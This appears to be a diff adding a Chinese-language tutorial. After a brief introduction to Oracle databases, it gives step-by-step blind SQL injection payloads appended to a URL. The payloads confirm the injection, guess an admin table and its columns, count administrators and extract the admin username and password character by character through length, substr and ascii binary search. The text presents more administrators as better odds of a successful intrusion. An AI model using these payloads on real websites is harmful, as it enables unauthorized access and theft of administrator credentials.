@@ -1,0 +1,25 @@
+Oracle数据库由甲骨文公司开发，基于C/S架构。
+特点：
+  多用户，处理大量事务
+  数据安全性和完整性控制
+  分布式数据处理
+  可移植性强
+  
+1.判断是否存在注入 
+  and 1=1 返回正常
+  and 1=2 返回错误
+2.判断一下数据库中的表
+  网址后加上：and (select count(*) from admin) <>0返回正常，说明存在admin表。如果返回错误，可将admin改为username、manager等常用表名继续猜解。
+ 3.判断下该网站下有几个管理员
+   如果有多个的话，成功入侵的几率就会加大
+ and (select count(*) from admin)=1，返回正常说明只有一个管理员。
+4.已知表的前提下，判断表中字段结构
+ and (select count(name) from admin)>=0返回正常，说明存在name字段
+5.接下来采用ASCII码折半法猜解管理员帐号和密码
+  判断管理员帐号的长度
+     and (select count(*) from admin where length(name)>=5)=1
+  说明：length()函数用于求字符串的长度，此处猜测用户名的长度和5比较，即猜测是否由5个字符组成
+6.and (select count(*) from admin where ascii(substr(name,1,1))>=97)=1
+说明：substr()函数用于截取字符串，ascii()函数用于获取字符的ascii码，此处的意思是截取name字段的第一个字符，获取它的ascii码值，查询ascii码表可知97为字符a
+7.相同方法猜解密码
+   and (select count(*) from admin where length(pwd)>=8)=1，返回正常，即密码长度为8，此时可以判断密码应该为明文    
